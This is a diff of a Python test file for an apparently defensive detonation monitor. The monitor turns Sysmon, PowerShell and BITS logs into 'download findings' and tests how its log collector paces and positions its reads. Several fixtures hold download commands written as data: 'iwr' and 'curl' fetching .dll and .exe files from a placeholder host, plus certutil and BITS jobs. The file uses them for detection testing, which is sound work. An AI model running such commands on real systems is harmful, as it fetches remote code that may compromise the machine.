@@ -26,29 +26,20 @@ def iso(t):
     return datetime.fromtimestamp(BASE + t, timezone.utc).isoformat()
 
 
-def conn(t=0, dst="1.2.3.4", dport=443, pid=4812, image=IMAGE, record_id=None):
-    ev = {"timestamp": iso(t), "event_id": 3, "pid": str(pid), "image": image, "type": "NetworkConnect",
+def conn(t=0, dst="1.2.3.4", dport=443, pid=4812, image=IMAGE):
+    return {"timestamp": iso(t), "event_id": 3, "pid": str(pid), "image": image, "type": "NetworkConnect",
           "dst_ip": dst, "dst_port": str(dport), "dst_hostname": "-", "protocol": "tcp",
           "src_ip": "10.0.2.15", "src_port": str(51000 + t)}
-    if record_id is not None:
-        ev["record_id"] = record_id
-    return ev
 
 
-def proc(pid, parent=None, t=0, cmd="", image=IMAGE, record_id=None):
-    ev = {"timestamp": iso(t), "event_id": 1, "pid": str(pid), "image": image, "commandline": cmd,
+def proc(pid, parent=None, t=0, cmd="", image=IMAGE):
+    return {"timestamp": iso(t), "event_id": 1, "pid": str(pid), "image": image, "commandline": cmd,
           "parent_pid": str(parent) if parent is not None else "-", "parent_image": r"C:\x\parent.exe"}
-    if record_id is not None:
-        ev["record_id"] = record_id
-    return ev
 
 
-def dns_ev(name, ip, t=0, record_id=None):
-    ev = {"timestamp": iso(t), "event_id": 22, "pid": "4812", "image": IMAGE, "query": name, "result": ip,
+def dns_ev(name, ip, t=0):
+    return {"timestamp": iso(t), "event_id": 22, "pid": "4812", "image": IMAGE, "query": name, "result": ip,
           "status": "0"}
-    if record_id is not None:
-        ev["record_id"] = record_id
-    return ev
 
 
 def ps(text, pid=4812, t=0, record_id=None):
@@ -229,6 +220,7 @@ def test_a_finding_carries_what_task_five_builds_its_keys_from():
     f = download_findings([ps("iwr http://a.b/c.dll", pid=4812, t=7)], [], [], FLOWS, {4812})[0]
     assert (f["pid"], f["image"], f["dst_ip"], f["dst_port"], f["source"]) == (4812, IMAGE, "1.2.3.4", 80, "powershell")
     assert f["observed_at"] == "2026-11-14T10:00:07.000Z" and f["origin_pid"] == 4812 and f["id"]
+    assert f["in_detonation"] is True and f["self"] is False and f["requested_by"] is None
     ctx = firewall.Context(downloads={(f["pid"], f["dst_ip"], f["dst_port"])})
     tagged = firewall.classify([conn(t=0, dst="1.2.3.4", dport=80)], [], ctx)
     assert "download" in tagged[0]["tags"]
@@ -261,13 +253,32 @@ def test_bits_url_becomes_a_finding():
     assert f[0]["source"] == "bits"
 
 
-def test_a_bits_job_is_fetched_by_the_bits_service_not_by_its_requester():
-    svchost = flow(pid=900, image=r"C:\Windows\System32\svchost.exe", ip="9.9.9.9", port=80)
-    f = download_findings([], [], [bits("http://a.b/s.exe", pid=4812)], [svchost], {4812})
-    assert (f[0]["pid"], f[0]["image"], f[0]["dst_ip"], f[0]["origin_pid"]) == (900, svchost["image"], "9.9.9.9", 4812)
-    # a job nobody can name the requester of is no one's detonation
-    assert download_findings([], [], [bits("http://a.b/s.exe", pid=None)], [svchost], {4812}) == []
-    assert download_findings([], [], [bits("http://a.b/s.exe", pid=None)], [svchost], {4812}, "all") == []
+SVCHOST = r"C:\Windows\System32\svchost.exe"
+
+
+def test_a_bits_job_is_fetched_by_the_bits_service_and_says_so():
+    svchost = flow(pid=900, image=SVCHOST, ip="9.9.9.9", port=80)
+    f = download_findings([], [], [bits("http://a.b/s.exe", pid=None, t=5)], [svchost], {4812})[0]
+    assert (f["pid"], f["image"], f["dst_ip"], f["origin_pid"]) == (900, SVCHOST, "9.9.9.9", None)
+    assert f["requested_by"] == "bits" and f["source"] == "bits"
+    other = download_findings([ps("iwr http://a.b/c.dll")], [], [], FLOWS, {4812})[0]
+    assert other["requested_by"] is None
+
+
+def test_a_bits_job_is_in_a_detonation_by_the_window_not_by_the_pid():
+    svchost = flow(pid=900, image=SVCHOST, ip="9.9.9.9", port=80)
+    started = [proc(4812, parent=1, t=0)]
+
+    def job(t, submissions, procs=started, pid=None):
+        return download_findings([], procs, [bits("http://a.b/s.exe", pid=pid, t=t)], [svchost], submissions)[0]
+    assert job(5, {4812})["in_detonation"] is True            # nobody names the requester; a submission was running
+    assert job(5, {4812}, pid=900)["in_detonation"] is True    # the BITS service's own pid is no submission either
+    assert job(-10, {4812})["in_detonation"] is False          # the job is older than the submission
+    assert job(5, set())["in_detonation"] is False             # no submission in a window
+    assert job(5, {4812}, procs=[])["in_detonation"] is True   # a submission whose start the ring has lost
+    assert job(5, {4812}, procs=[proc(4812, t=50)])["in_detonation"] is False
+    undated = dict(bits("http://a.b/s.exe", pid=None), timestamp="junk")
+    assert download_findings([], started, [undated], [svchost], {4812})[0]["in_detonation"] is False
 
 
 def test_sysmon_commandline_is_a_source_and_an_ancestor_counts():
@@ -276,8 +287,9 @@ def test_sysmon_commandline_is_a_source_and_an_ancestor_counts():
     assert f[0]["source"] == "sysmon" and f[0]["pid"] == 5000 and f[0]["image"] == r"C:\Windows\certutil.exe"
     grandchild = proc(6000, parent=5000, cmd="curl http://a.b/z.exe")
     f = download_findings([], [proc(4812), certutil, grandchild], [], [flow(pid=6000)], {4812})
-    assert f[0]["pid"] == 6000
-    assert download_findings([], [certutil], [], [flow(pid=5000)], {1234}) == []
+    assert f[0]["pid"] == 6000 and f[0]["in_detonation"] is True
+    elsewhere = download_findings([], [certutil], [], [flow(pid=5000)], {1234})
+    assert [x["in_detonation"] for x in elsewhere] == [False]
 
 
 def test_a_url_without_a_connection_to_it_is_no_finding_yet():
@@ -295,22 +307,29 @@ def test_a_url_with_an_address_is_matched_by_the_address_and_the_port_is_preferr
     assert download_findings([ps("iwr http://[::1/c.dll")], [], [], FLOWS, {4812}) == []
 
 
-def test_ask_mode_all_skips_the_detonation_test_and_off_returns_nothing():
+def test_every_finding_is_returned_and_says_whether_it_is_in_a_detonation():
     events = [ps("iwr http://a.b/c.dll", pid=99)]
-    assert download_findings(events, [], [], [flow(pid=99)], set(), "all")[0]["pid"] == 99
-    assert download_findings(events, [], [], [flow(pid=99)], {99}, "off") == []
-    assert download_findings(events, [], [], [flow(pid=99)], set(), "detonation") == []
-    with pytest.raises(ValueError):
-        download_findings(events, [], [], [flow(pid=99)], set(), "sometimes")
+    f = download_findings(events, [], [], [flow(pid=99)], set())
+    assert [(x["pid"], x["in_detonation"]) for x in f] == [(99, False)]
+    assert download_findings(events, [], [], [flow(pid=99)], {99})[0]["in_detonation"] is True
+    child = [proc(99, parent=50), proc(50, parent=4812)]
+    assert download_findings(events, child, [], [flow(pid=99)], {4812})[0]["in_detonation"] is True
+    assert download_findings(events, child, [], [flow(pid=99)], {77})[0]["in_detonation"] is False
 
 
-def test_tdc_own_processes_never_make_a_finding():
-    tdc = flow(pid=99, image=TDC_PYTHON)
+def test_the_ask_policy_is_not_this_modules_business():
+    with pytest.raises(TypeError):
+        download_findings([], [], [], [], set(), "all")
+    with pytest.raises(TypeError):
+        download_findings([], [], [], [], set(), ask_mode="off")
+
+
+def test_a_finding_marks_tdc_own_processes_instead_of_dropping_them():
     events = [ps("iwr http://a.b/c.dll", pid=99)]
-    assert download_findings(events, [], [], [tdc], set(), "all") == []
-    assert download_findings(events, [], [], [tdc], {99}) == []
+    assert download_findings(events, [], [], [flow(pid=99, image=TDC_PYTHON)], {99})[0]["self"] is True
     git = flow(pid=99, image=r"C:\Program Files\Git\cmd\git.exe")
-    assert download_findings(events, [], [], [git], set(), "all") == []
+    assert download_findings(events, [], [], [git], set())[0]["self"] is True
+    assert download_findings(events, [], [], [flow(pid=99)], set())[0]["self"] is False
 
 
 def test_findings_come_oldest_first():
@@ -550,10 +569,23 @@ def test_a_corrupt_or_odd_settings_file_gives_defaults_and_says_why(tmp_path):
 # ---- the collector -------------------------------------------------------------------------
 
 
+class Clock:
+    def __init__(self, t=BASE + 100):
+        self.t = t
+
+    def __call__(self):
+        return self.t
+
+
 def readers(**over):
     base = {name: (lambda **k: []) for name in firewall_store.SOURCES}
     base.update(over)
     return base
+
+
+def collector(tmp_path, rs=None, window=False, clock=None):
+    store, settings = FirewallStore(), Settings(str(tmp_path / "s.json"))
+    return store, FirewallCollector(store, settings, rs or readers(), lambda: window, now=clock or Clock())
 
 
 def test_collector_ticks_fast_only_in_the_detonation_window(tmp_path):
@@ -583,25 +615,99 @@ def test_a_failing_reader_does_not_stop_the_tick(tmp_path):
     assert store.stats()["status"]["dns"] == "ok"
 
 
-def test_the_readers_get_their_cursor_and_events_flow_into_the_store(tmp_path):
-    store, settings = FirewallStore(), Settings(str(tmp_path / "s.json"))
-    seen = []
-    batches = iter([[conn(t=0, record_id=7), conn(t=1, record_id=9)], [conn(t=2, record_id=12)], []])
+def sysmon_reader(batches, asked):
+    """A Sysmon reader the way log_store.Collector asks: ``(event_ids, since_iso)``."""
+    batches = iter(batches)
 
-    def read_connections(since=None):
-        seen.append(since)
-        return next(batches)
+    def read(event_ids, since_iso):
+        asked.append((list(event_ids), firewall.epoch_of(since_iso)))
+        batch = next(batches)
+        if isinstance(batch, Exception):
+            raise batch
+        return batch
+    return read
 
-    c = FirewallCollector(store, settings, readers(connections=read_connections), lambda: False)
-    assert c.tick()["connections"] == 2
-    assert c.tick()["connections"] == 1
-    assert c.tick()["connections"] == 0
-    assert seen == [None, 9, 12]
+
+def test_the_sysmon_readers_are_asked_by_time_with_an_overlap_of_five_seconds(tmp_path):
+    asked = []
+    read = sysmon_reader([[conn(t=10), conn(t=20)], [conn(t=30)], []], asked)
+    store, c = collector(tmp_path, readers(connections=read))
+    assert [c.tick()["connections"] for _ in range(3)] == [2, 1, 0]
+    assert asked == [([3], BASE + 100 - 86400), ([3], BASE + 15), ([3], BASE + 25)]
     assert len(store.events()) == 3
 
 
+def test_each_sysmon_source_asks_for_its_own_event_and_keeps_its_own_position(tmp_path):
+    asked = {"connections": [], "dns": [], "processes": []}
+    rs = readers(connections=sysmon_reader([[conn(t=50)], []], asked["connections"]),
+                 dns=sysmon_reader([[], []], asked["dns"]),
+                 processes=sysmon_reader([[proc(4812, t=40)], []], asked["processes"]))
+    store, c = collector(tmp_path, rs)
+    c.tick()
+    c.tick()
+    assert [a[0] for a in asked["connections"]] == [[3], [3]] and asked["dns"][0][0] == [22]
+    assert asked["processes"][0][0] == [1]
+    assert (asked["connections"][1][1], asked["processes"][1][1], asked["dns"][1][1]) == \
+        (BASE + 45, BASE + 35, BASE + 100 - 86400)       # nothing seen yet: nothing to move on from
+
+
+def test_an_overlapping_reread_adds_nothing_twice(tmp_path):
+    first = [conn(t=10), conn(t=20)]
+    rs = readers(connections=sysmon_reader([first, first + [conn(t=21)]], []),
+                 dns=sysmon_reader([[dns_ev("a.b", "1.2.3.4", t=1)], [dns_ev("a.b", "1.2.3.4", t=1)]], []),
+                 processes=sysmon_reader([[proc(10, t=1)], [proc(10, t=1), proc(11, parent=10, t=2)]], []))
+    store, c = collector(tmp_path, rs)
+    assert c.tick() == {"connections": 2, "dns": 1, "processes": 1, "powershell": 0, "firewall": 0}
+    assert c.tick() == {"connections": 1, "dns": 0, "processes": 1, "powershell": 0, "firewall": 0}
+    assert len(store.events()) == 3 and len(store.process_events()) == 2 and store.dns() == {"1.2.3.4": "a.b"}
+
+
+def test_a_reread_answer_does_not_overwrite_a_newer_one(tmp_path):
+    old, new = dns_ev("old.example", "1.2.3.4", t=1), dns_ev("new.example", "1.2.3.4", t=9)
+    store, c = collector(tmp_path, readers(dns=sysmon_reader([[old, new], [old]], [])))
+    c.tick()
+    c.tick()
+    assert store.dns() == {"1.2.3.4": "new.example"}
+
+
+def test_the_dedup_memory_is_bounded(tmp_path):
+    store = FirewallStore()
+    n = firewall_store.MAX_DEDUP_KEYS + 10
+    store.add_connections([dict(conn(t=0), src_port=str(i)) for i in range(n)])
+    assert len(store._seen["connections"]) == firewall_store.MAX_DEDUP_KEYS
+
+
+def test_a_full_page_inside_the_overlap_moves_the_position_on(tmp_path):
+    asked = []
+    page = [dict(conn(t=100), src_port=str(i)) for i in range(firewall_store.SYSMON_PAGE)]
+    read = sysmon_reader([[conn(t=100)], page, []], asked)
+    store, c = collector(tmp_path, readers(connections=read), clock=Clock(BASE + 200))
+    for _ in range(3):
+        c.tick()
+    assert [a[1] for a in asked[1:]] == [BASE + 95, BASE + 100]     # a page that full would be read again otherwise
+
+
+def test_the_position_never_runs_backwards_nor_into_the_future(tmp_path):
+    asked = []
+    read = sysmon_reader([[conn(t=5000)], [conn(t=3)], [conn(t=60)], []], asked)
+    store, c = collector(tmp_path, readers(connections=read), clock=Clock(BASE + 100))
+    for _ in range(4):
+        c.tick()
+    # a clock-skewed event does not take the position beyond now; an old one does not take it back
+    assert [a[1] for a in asked] == [BASE + 100 - 86400, BASE + 95, BASE + 95, BASE + 95]
+
+
+def test_a_failed_read_leaves_the_position_and_a_cleared_log_is_read_on(tmp_path):
+    asked = []
+    read = sysmon_reader([[conn(t=10)], RuntimeError("access denied"), [], [conn(t=40)]], asked)
+    store, c = collector(tmp_path, readers(connections=read))
+    for _ in range(4):
+        c.tick()
+    assert [a[1] for a in asked] == [BASE + 100 - 86400, BASE + 5, BASE + 5, BASE + 5]
+    assert len(store.events()) == 2 and store.stats()["status"]["connections"] == "ok"
+
+
 def test_a_cursor_never_runs_backwards_and_an_explicit_one_is_taken_as_it_is(tmp_path):
-    store, settings = FirewallStore(), Settings(str(tmp_path / "s.json"))
     seen = []
     results = iter([([{"time": iso(0), "fields": {}}], 5000), ([], 120), ([], 0)])
 
@@ -609,45 +715,44 @@ def test_a_cursor_never_runs_backwards_and_an_explicit_one_is_taken_as_it_is(tmp
         seen.append(since)
         return next(results)
 
-    c = FirewallCollector(store, settings, readers(firewall=read_firewall), lambda: False)
+    store, c = collector(tmp_path, readers(firewall=read_firewall))
     for _ in range(3):
         c.tick()
     assert seen == [None, 5000, 120]                 # the log was rotated: the reader says so, the collector follows
-    older = iter([[conn(t=0, record_id=50)], [conn(t=1, record_id=10)], []])
+    older = iter([[ps("iwr http://a.b/c.dll", record_id=50)], [ps("iwr http://a.b/d.dll", record_id=10)], []])
     seen2 = []
 
-    def read_connections(since=None):
+    def read_ps(since=None):
         seen2.append(since)
         return next(older)
 
-    c2 = FirewallCollector(store, settings, readers(connections=read_connections), lambda: False)
+    store2, c2 = collector(tmp_path, readers(powershell=read_ps))
     for _ in range(3):
         c2.tick()
     assert seen2 == [None, 50, 50]
 
 
-def test_record_ids_in_fields_count_too_and_events_without_any_are_refused(tmp_path):
-    store, settings = FirewallStore(), Settings(str(tmp_path / "s.json"))
+def test_the_powershell_reader_keeps_event_record_ids_and_events_without_any_are_refused(tmp_path):
     seen = []
-    results = iter([[ps("iwr http://a.b/c.dll", record_id=31)], []])
+    results = iter([[ps("iwr http://a.b/c.dll", record_id=31)], [ps("iwr http://a.b/d.dll")], []])
 
     def read_ps(since=None):
         seen.append(since)
         return next(results)
 
-    c = FirewallCollector(store, settings, readers(powershell=read_ps,
-                                                   connections=lambda **k: [conn(t=0)]), lambda: False)
+    store, c = collector(tmp_path, readers(powershell=read_ps))
     c.tick()
+    assert store.stats()["status"]["powershell"] == "ok"
     c.tick()
-    assert seen == [None, 31]
-    assert store.stats()["status"]["connections"] == "unavailable"
-    assert "record_id" in store.stats()["hints"]["connections"] and store.events() == []
+    assert store.stats()["status"]["powershell"] == "unavailable"
+    assert "record_id" in store.stats()["hints"]["powershell"] and len(store.powershell()) == 1
+    c.tick()
+    assert seen == [None, 31, 31]
 
 
 def test_a_reader_that_reports_an_error_marks_the_source_unavailable_and_recovers(tmp_path):
-    store, settings = FirewallStore(), Settings(str(tmp_path / "s.json"))
-    answers = iter([[{"error": "Sysmon event query timed out"}], [conn(t=0, record_id=1)]])
-    c = FirewallCollector(store, settings, readers(connections=lambda **k: next(answers)), lambda: False)
+    answers = iter([[{"error": "Sysmon event query timed out"}], [conn(t=0)]])
+    store, c = collector(tmp_path, readers(connections=lambda **k: next(answers)))
     c.tick()
     assert store.stats()["status"]["connections"] == "unavailable"
     assert store.stats()["hints"]["connections"] == "Sysmon event query timed out"
@@ -656,30 +761,56 @@ def test_a_reader_that_reports_an_error_marks_the_source_unavailable_and_recover
 
 
 def test_a_missing_reader_is_a_status_not_a_crash(tmp_path):
-    store, settings = FirewallStore(), Settings(str(tmp_path / "s.json"))
     rs = readers()
     del rs["dns"]
-    FirewallCollector(store, settings, rs, lambda: False).tick()
+    store, c = collector(tmp_path, rs)
+    c.tick()
     assert store.stats()["status"]["dns"] == "unavailable" and store.stats()["status"]["processes"] == "ok"
 
 
 def test_bits_is_read_only_inside_the_detonation_window(tmp_path):
-    store, settings = FirewallStore(), Settings(str(tmp_path / "s.json"))
     calls = []
     rs = readers(bits=lambda **k: calls.append(k) or [bits("http://a.b/s.exe", record_id=4)])
-    FirewallCollector(store, settings, rs, lambda: False).tick()
+    store, c = collector(tmp_path, rs, window=False)
+    c.tick()
     assert calls == [] and store.stats()["status"]["bits"] == "idle" and store.bits() == []
-    FirewallCollector(store, settings, rs, lambda: True).tick()
-    assert len(calls) == 1 and len(store.bits()) == 1 and store.stats()["status"]["bits"] == "ok"
+    store2, c2 = collector(tmp_path, rs, window=True)
+    c2.tick()
+    assert len(calls) == 1 and len(store2.bits()) == 1 and store2.stats()["status"]["bits"] == "ok"
+
+
+def test_in_the_window_the_tick_is_lean_and_powershell_and_the_firewall_keep_the_slow_pace(tmp_path):
+    calls = []
+    spies = {name: (lambda name=name, **k: calls.append(name) or []) for name in firewall_store.SOURCES}
+    clock = Clock(BASE)
+    _, c = collector(tmp_path, spies, window=True, clock=clock)
+    for _ in range(11):                       # t = 0 .. 10
+        c.tick()
+        clock.t += 1
+    for name in ("connections", "dns", "processes", "bits"):
+        assert calls.count(name) == 11, name
+    assert calls.count("powershell") == 2 and calls.count("firewall") == 2      # t = 0 and t = 10
+    assert [n for n in calls[:6]] == ["connections", "dns", "processes", "powershell", "firewall", "bits"]
+
+
+def test_outside_the_window_every_source_is_read_at_every_tick(tmp_path):
+    calls = []
+    spies = {name: (lambda name=name, **k: calls.append(name) or []) for name in firewall_store.SOURCES}
+    clock = Clock(BASE)
+    _, c = collector(tmp_path, spies, window=False, clock=clock)
+    for _ in range(3):
+        c.tick()
+        clock.t += 10
+    assert calls.count("powershell") == 3 and calls.count("firewall") == 3 and calls.count("bits") == 0
 
 
 def test_a_tick_fills_the_whole_store(tmp_path):
-    store, settings = FirewallStore(), Settings(str(tmp_path / "s.json"))
-    rs = readers(connections=lambda **k: [conn(t=0, record_id=1)],
-                 dns=lambda **k: [dns_ev("a.b", "1.2.3.4", record_id=5)],
-                 processes=lambda **k: [proc(4812, parent=1, record_id=2)],
+    rs = readers(connections=lambda **k: [conn(t=0)],
+                 dns=lambda **k: [dns_ev("a.b", "1.2.3.4")],
+                 processes=lambda **k: [proc(4812, parent=1)],
                  powershell=lambda **k: [ps("iwr http://a.b/c.dll", record_id=3)])
-    added = FirewallCollector(store, settings, rs, lambda: False).tick()
+    store, c = collector(tmp_path, rs)
+    added = c.tick()
     assert added == {"connections": 1, "dns": 1, "processes": 1, "powershell": 1, "firewall": 0}
     stats = store.stats()
     assert stats["counts"] == {"connections": 1, "dns": 1, "processes": 1, "powershell": 1, "firewall": 0, "bits": 0}
@@ -687,14 +818,14 @@ def test_a_tick_fills_the_whole_store(tmp_path):
 
 
 def test_the_whole_chain_from_a_reader_to_a_finding(tmp_path):
-    store, settings = FirewallStore(), Settings(str(tmp_path / "s.json"))
-    rs = readers(connections=lambda **k: [dict(conn(t=2, dst="1.2.3.4", dport=80, record_id=1))],
-                 dns=lambda **k: [dns_ev("a.b", "1.2.3.4", t=1, record_id=4)],
-                 processes=lambda **k: [proc(4812, parent=1, record_id=2)],
+    rs = readers(connections=lambda **k: [conn(t=2, dst="1.2.3.4", dport=80)],
+                 dns=lambda **k: [dns_ev("a.b", "1.2.3.4", t=1)],
+                 processes=lambda **k: [proc(4812, parent=1)],
                  powershell=lambda **k: [ps("iwr http://a.b/c.dll", t=1, record_id=3)])
-    FirewallCollector(store, settings, rs, lambda: False).tick()
+    store, c = collector(tmp_path, rs)
+    c.tick()
     flows = firewall.classify(store.events(), store.firewall_events(),
                               firewall.Context(dns=store.dns(), processes=store.processes()))
-    found = download_findings(store.powershell(), store.process_events(), store.bits(), flows, {4812},
-                              settings.ask_mode)
-    assert [(f["url"], f["dst_ip"], f["dst_port"]) for f in found] == [("http://a.b/c.dll", "1.2.3.4", 80)]
+    found = download_findings(store.powershell(), store.process_events(), store.bits(), flows, {4812})
+    assert [(f["url"], f["dst_ip"], f["dst_port"], f["in_detonation"]) for f in found] == \
+        [("http://a.b/c.dll", "1.2.3.4", 80, True)]
